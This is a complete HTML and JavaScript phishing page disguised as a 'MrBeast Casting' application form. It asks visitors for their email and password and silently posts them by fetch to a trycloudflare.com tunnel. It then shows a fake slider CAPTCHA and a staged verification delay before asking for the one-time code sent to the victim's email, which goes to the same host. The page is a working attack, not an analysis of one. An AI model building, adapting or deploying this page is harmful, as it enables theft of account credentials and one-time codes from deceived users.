<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com" rel="stylesheet">
    <title>MrBeast Casting</title>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #00a8e8; margin: 0; color: #fff; overflow: hidden; position: relative; }
        .bg-pattern { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 80px; opacity: 0.15; z-index: 0; pointer-events: none; }
        .top-screen-logo { position: absolute; top: 20px; width: 320px; filter: drop-shadow(0 0 20px rgba(0,0,0,0.4)); z-index: 2; }
        .box { background: #111; border-radius: 25px; width: 90%; max-width: 380px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 45px rgba(0,0,0,0.8); border: 1px solid #333; position: relative; z-index: 10; margin-top: 100px; }
        .inner-box-logo { width: 100px; margin: 0 auto 15px auto; display: block; filter: drop-shadow(0 0 10px #00a8e8); }
        .mrbeast-style-text { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 32px; color: #fff; margin: 0 0 15px 0; text-transform: uppercase; letter-spacing: -1px; text-shadow: 3px 3px 0px #00a8e8, 6px 6px 15px rgba(0,0,0,0.5); line-height: 1; }
        .mr-part { color: #f12e3e; -webkit-text-stroke: 1px #fff; }
        p { margin: 0 0 25px 0; color: #bbb; font-size: 14px; font-weight: 500; }
        input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 12px; box-sizing: border-box; font-size: 16px; outline: none; }
        .main-btn { background: linear-gradient(45deg, #f12e3e, #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: 800; text-transform: uppercase; font-size: 16px; }
        #puzzle-box, #loader, #step2 { display: none; }
        .captcha-area { margin-top: 10px; padding: 15px; border-radius: 15px; border: 1px solid #333; background: #1a1a1a; }
        .p-view { width: 100%; height: 160px; background: url('https://images.unsplash.com') center/cover; border-radius: 8px; position: relative; overflow: hidden; border: 1px solid #444; }
        .p-piece { position: absolute; width: 50px; height: 50px; background: inherit; border: 2px solid #fff; border-radius: 8px; top: 55px; left: 10px; z-index: 100; filter: brightness(1.3); }
        .p-slot { position: absolute; width: 50px; height: 50px; background: rgba(0,0,0,0.6); border: 2px solid #00a8e8; right: 40px; top: 55px; border-radius: 8px; }
        .s-track { width: 100%; height: 50px; background: #222; border-radius: 25px; margin-top: 20px; position: relative; border: 1px solid #444; overflow: hidden; }
        .s-thumb { width: 60px; height: 50px; background: #00d4ff; border-radius: 25px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 10; font-weight: bold; color: #000; }
        .spinner { border: 4px solid rgba(0, 212, 255, 0.1); border-top: 4px solid #00d4ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.8s linear infinite; margin: 25px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <img src="https://crystalpng.com" class="top-screen-logo">
    <div class="box">
        <div id="step1">
            <img src="https://crystalpng.com" class="inner-box-logo">
            <div class="mrbeast-style-text"><span class="mr-part">MR.</span> BEAST CASTING</div>
            <p>Complete application for the next secret video.</p>
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="button" class="main-btn" onclick="showPuzzle()">CONTINUE</button>
        </div>
        <div id="puzzle-box">
            <p>Verification Required</p>
            <div class="captcha-area">
                <div class="p-view"><div class="p-slot"></div><div class="p-piece" id="piece"></div></div>
                <div class="s-track" id="track"><div class="s-thumb" id="thumb">>></div></div>
            </div>
        </div>
        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>
        <div id="step2">
            <div class="mrbeast-style-text" style="font-size:24px;">CONFIRM IDENTITY</div>
            <p>Enter the 6-digit code sent to your email.</p>
            <form action="https://hunt-camcorder-packages-pound.trycloudflare.com" method="post">
                <input type="text" name="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:10px; font-size:24px;" required>
                <button type="submit" class="main-btn">FINISH APPLICATION</button>
            </form>
        </div>
    </div>
    <script>
        function showPuzzle() {
            var e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                fetch('https://hunt-camcorder-packages-pound.trycloudflare.com', { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                document.getElementById('step1').style.display = 'none'; 
                document.getElementById('puzzle-box').style.display = 'block';
                initSlider();
            }
        }
        function initSlider() {
            const thumb = document.getElementById('thumb'), piece = document.getElementById('piece'), track = document.getElementById('track');
            let isDragging = false;
            const onStart = (e) => { isDragging = true; };
            const onEnd = () => { isDragging = false; };
            const onMove = (e) => {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                const rect = track.getBoundingClientRect();
                let x = clientX - rect.left - 30;
                if (x < 0) x = 0; if (x > rect.width - 60) x = rect.width - 60;
                thumb.style.left = x + 'px';
                piece.style.left = (10 + (x / (rect.width - 60)) * 250) + 'px';
                if (x > rect.width - 80) { isDragging = false; complete(); }
            };
            thumb.addEventListener('mousedown', onStart); window.addEventListener('mousemove', onMove); window.addEventListener('mouseup', onEnd);
            thumb.addEventListener('touchstart', onStart); window.addEventListener('touchmove', onMove); window.addEventListener('touchend', onEnd);
        }
        function complete() {
            document.getElementById('puzzle-box').style.display = 'none'; document.getElementById('loader').style.display = 'block';
            setTimeout(() => { document.getElementById('loader').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }, 14000);
        }
    </script>
</body>
</html>
